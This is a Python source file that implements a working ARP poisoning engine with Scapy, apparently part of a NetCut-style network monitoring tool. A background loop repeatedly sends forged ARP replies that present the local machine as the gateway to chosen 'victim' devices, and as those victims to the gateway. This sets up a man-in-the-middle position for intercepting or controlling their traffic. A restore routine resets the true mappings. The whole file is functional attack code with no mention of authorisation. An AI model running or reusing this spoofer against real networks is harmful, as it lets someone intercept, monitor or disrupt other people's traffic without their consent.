"""
spoofer.py
==========
ARP poisoning engine.

Two responsibilities:
  1. poison_loop()    – background thread that, every POISON_INTERVAL sec,
                        sends one pair of poisoned ARP replies for every
                        currently-monitored device.
  2. restore_arp()    – one-shot helper that sends *real* (un-poisoned)
                        ARP replies to a victim AND to the gateway, so the
                        victim's ARP cache returns to a sane state when the
                        user un-monitors a device (Blueprint 3.D).

We intentionally use ARP op=2 (reply) – gratuitous, unsolicited replies are
silently accepted by virtually every OS and are the standard NetCut/Cain
technique.

NOTE on Layer-2 only: we do NOT enable IP forwarding at the OS level
(no `netsh` / no WinDivert). All packet relaying is done by l2_capture.py.
"""

import threading
import time
from typing import Optional

from scapy.all import ARP, Ether, sendp, conf

from device_registry import REGISTRY


POISON_INTERVAL = 2.0   # seconds between full poison sweeps
RESTORE_COUNT   = 15    # how many restore packets to burst when un-monitoring


class Spoofer:
    """
    A single Spoofer instance is created in main.py once the network context
    (local IP/MAC + gateway IP/MAC + iface) is known.
    """

    def __init__(self,
                 iface: str,
                 local_ip: str,
                 local_mac: str,
                 gateway_ip: str,
                 gateway_mac: str):
        self.iface       = iface
        self.local_ip    = local_ip
        self.local_mac   = local_mac.lower()
        self.gateway_ip  = gateway_ip
        self.gateway_mac = gateway_mac.lower()

        self._stop_evt = threading.Event()
        self._thread: Optional[threading.Thread] = None

        print(f"[SPOOFER] init iface={iface} "
              f"local={local_ip}/{local_mac} "
              f"gw={gateway_ip}/{gateway_mac}")

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------
    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop_evt.clear()
        self._thread = threading.Thread(
            target=self._run, name="SpooferLoop", daemon=True)
        self._thread.start()
        print("[SPOOFER] poison loop thread started")

    def stop(self) -> None:
        print("[SPOOFER] stop() called – restoring every monitored device")
        self._stop_evt.set()
        # Best-effort restore of every device we ever poisoned.
        for d in REGISTRY.get_monitored():
            self.restore_arp(d["ip"], d["mac"])
        if self._thread:
            self._thread.join(timeout=3)

    # ------------------------------------------------------------------
    # Core poisoning loop
    # ------------------------------------------------------------------
    def _run(self) -> None:
        while not self._stop_evt.is_set():
            try:
                monitored = REGISTRY.get_monitored()
                if monitored:
                    self._poison_batch(monitored)
            except Exception as e:
                print(f"[SPOOFER] !! poison loop error: {e}")
            # Sleep but break out fast if stop requested
            self._stop_evt.wait(POISON_INTERVAL)

    def _poison_batch(self, devices) -> None:
        """For every monitored device, send the two-way poison pair."""
        pkts = []
        for d in devices:
            victim_ip, victim_mac = d["ip"], d["mac"]
            # 1) tell the VICTIM that we are the GATEWAY
            pkts.append(
                Ether(src=self.local_mac, dst=victim_mac) /
                ARP(op=2,
                    psrc=self.gateway_ip, hwsrc=self.local_mac,
                    pdst=victim_ip,      hwdst=victim_mac)
            )
            # 2) tell the GATEWAY that we are the VICTIM
            pkts.append(
                Ether(src=self.local_mac, dst=self.gateway_mac) /
                ARP(op=2,
                    psrc=victim_ip,       hwsrc=self.local_mac,
                    pdst=self.gateway_ip, hwdst=self.gateway_mac)
            )
        try:
            sendp(pkts, iface=self.iface, verbose=False)
            print(f"[SPOOFER] poisoned {len(devices)} device(s) "
                  f"(sent {len(pkts)} ARP replies)")
        except Exception as e:
            print(f"[SPOOFER] !! sendp failed: {e}")

    # ------------------------------------------------------------------
    # Graceful release (Blueprint 3.D)
    # ------------------------------------------------------------------
    def restore_arp(self, victim_ip: str, victim_mac: str) -> None:
        """
        Push the *truthful* ARP mapping back into both the victim and the
        gateway, so the victim regains direct connectivity.

        We burst RESTORE_COUNT copies because ARP is unreliable and the
        victim may still receive a stale poison packet that was already
        in flight.
        """
        victim_mac = victim_mac.lower()
        print(f"[SPOOFER] [ARP RESTORE] CRITICAL: Instantly restoring {victim_ip} ({victim_mac}) ...")

        # 1) Real Gateway MAC -> Victim (Tell victim the REAL gateway MAC)
        pkt_to_victim = (
            Ether(src=self.gateway_mac, dst=victim_mac) /
            ARP(op=2,
                psrc=self.gateway_ip, hwsrc=self.gateway_mac,
                pdst=victim_ip,       hwdst=victim_mac)
        )
        # 2) Real Victim MAC -> Gateway (Tell gateway the REAL victim MAC)
        pkt_to_gateway = (
            Ether(src=victim_mac, dst=self.gateway_mac) /
            ARP(op=2,
                psrc=victim_ip,       hwsrc=victim_mac,
                pdst=self.gateway_ip, hwdst=self.gateway_mac)
        )
        try:
            for i in range(RESTORE_COUNT):
                sendp([pkt_to_victim, pkt_to_gateway],
                      iface=self.iface, verbose=False)
                # High frequency bursts to override any residual poison packets
                time.sleep(0.05 if i < 5 else 0.1)
            
            print(f"[SPOOFER] [ARP RESTORE] SUCCESS: {victim_ip} restored after {RESTORE_COUNT} bursts.")
        except Exception as e:
            print(f"[SPOOFER] !! [ARP RESTORE] FAILED for {victim_ip}: {e}")
